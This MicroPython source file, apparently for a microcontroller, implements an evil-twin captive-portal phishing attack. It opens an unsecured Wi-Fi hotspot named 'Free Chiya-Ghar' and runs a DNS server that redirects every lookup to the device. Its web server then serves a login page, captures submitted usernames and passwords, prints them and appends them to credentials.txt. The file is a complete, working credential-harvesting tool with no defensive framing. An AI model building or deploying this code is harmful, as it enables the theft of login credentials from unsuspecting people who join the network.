import gc
import sys
import network
import socket
import uasyncio as asyncio

# Helper to detect uasyncio v3
IS_UASYNCIO_V3 = hasattr(asyncio, "__version__") and asyncio.__version__ >= (3,)

# Access point settings
SERVER_SSID = 'Free Chiya-Ghar'  # max 32 characters
SERVER_IP = '10.0.0.1'
SERVER_SUBNET = '255.255.255.0'

# Credentials file
CREDENTIALS_FILE = 'credentials.txt'

def save_credentials(username, password):
    """Save captured credentials to text file"""
    try:
        with open(CREDENTIALS_FILE, 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        print("Credentials saved successfully")
    except Exception as e:
        print(f"Error saving credentials: {e}")

def wifi_start_access_point():
    """Setup the access point"""
    wifi = network.WLAN(network.AP_IF)
    wifi.active(True)
    wifi.ifconfig((SERVER_IP, SERVER_SUBNET, SERVER_IP, SERVER_IP))
    wifi.config(essid=SERVER_SSID, authmode=network.AUTH_OPEN)
    print('Network config:', wifi.ifconfig())

def _handle_exception(loop, context):
    """uasyncio v3 only: global exception handler"""
    print('Global exception handler')
    sys.print_exception(context["exception"])
    sys.exit()

class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.domain = ''
        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
            while lon != 0:
                self.domain += data[ini + 1:ini + lon + 1].decode('utf-8') + '.'
                ini += lon + 1
                lon = data[ini]
        print("DNSQuery domain:" + self.domain)

    def response(self, ip):
        print("DNSQuery response: {} ==> {}".format(self.domain, ip))
        if self.domain:
            packet = self.data[:2] + b'\x81\x80'
            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += b'\xC0\x0C'  # Pointer to domain name
            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3C\x00\x04'  # Response type, ttl and resource data length -> 4 bytes
            packet += bytes(map(int, ip.split('.')))  # 4bytes of IP
        return packet

class MyApp:
    async def start(self):
        # Initialize credentials file
        self.initialize_credentials_file()
        
        # Rest of the existing start code...
        loop = asyncio.get_event_loop()
        if IS_UASYNCIO_V3:
            loop.set_exception_handler(_handle_exception)
        wifi_start_access_point()
        server = asyncio.start_server(self.handle_http_connection, "0.0.0.0", 80)
        loop.create_task(server)
        loop.create_task(self.run_dns_server())
        print('Looping forever...')
        loop.run_forever()

    def initialize_credentials_file(self):
        """Create empty credentials file if it doesn't exist"""
        try:
            # Try opening in read mode to check existence
            with open(CREDENTIALS_FILE, 'r'):
                pass
        except OSError:
            # File doesn't exist, create it
            try:
                with open(CREDENTIALS_FILE, 'w') as f:
                    f.write("Captured Credentials:\n")
                print("Created new credentials file")
            except Exception as e:
                print(f"Error creating credentials file: {e}")

    async def handle_http_connection(self, reader, writer):
        gc.collect()
        data = await reader.readline()
        request_line = data.decode()
        addr = writer.get_extra_info('peername')
        print('Received {} from {}'.format(request_line.strip(), addr))

        method = 'GET'
        path = '/'
        if len(request_line.strip()) > 0:
            parts = request_line.strip().split()
            if len(parts) >= 2:
                method = parts[0].upper()
                path = parts[1]

        headers = []
        while True:
            gc.collect()
            line = await reader.readline()
            if line == b'\r\n':
                break
            headers.append(line)

        if method == 'POST':
            content_length = 0
            for h in headers:
                header_line = h.decode().strip()
                if ':' in header_line:
                    name, value = header_line.split(':', 1)
                    name = name.strip().lower()
                    value = value.strip()
                    if name == 'content-length':
                        content_length = int(value)
                        break

            if content_length > 0:
                body = await reader.read(content_length)
                body_str = body.decode()
                form_data = {}
                pairs = body_str.split('&')
                for pair in pairs:
                    if '=' in pair:
                        key, val = pair.split('=', 1)
                        form_data[key] = val
                username = form_data.get('username', '')
                password = form_data.get('password', '')
                print(f"Captured credentials - Username: {username}, Password: {password}")
                # Save credentials to file
                save_credentials(username, password)

        response = 'HTTP/1.0 200 OK\r\n\r\n'
        with open('index.html') as f:
            response += f.read()
        await writer.awrite(response)
        await writer.aclose()

    async def run_dns_server(self):
        """DNS server implementation (unchanged)"""
        # Existing DNS server code...
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.setblocking(False)
        udps.bind(('0.0.0.0', 53))
        while True:
            try:
                if IS_UASYNCIO_V3:
                    yield asyncio.core._io_queue.queue_read(udps)
                else:
                    yield asyncio.IORead(udps)
                data, addr = udps.recvfrom(4096)
                print("Incoming DNS request...")
                DNS = DNSQuery(data)
                udps.sendto(DNS.response(SERVER_IP), addr)
                print("Replying: {:s} -> {:s}".format(DNS.domain, SERVER_IP))
            except Exception as e:
                print("DNS server error:", e)
                await asyncio.sleep_ms(3000)
        udps.close()

# Main code entrypoint (unchanged)
try:
    myapp = MyApp()
    if IS_UASYNCIO_V3:
        asyncio.run(myapp.start())
    else:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(myapp.start())
except KeyboardInterrupt:
    print('Bye')
finally:
    if IS_UASYNCIO_V3:
        asyncio.new_event_loop()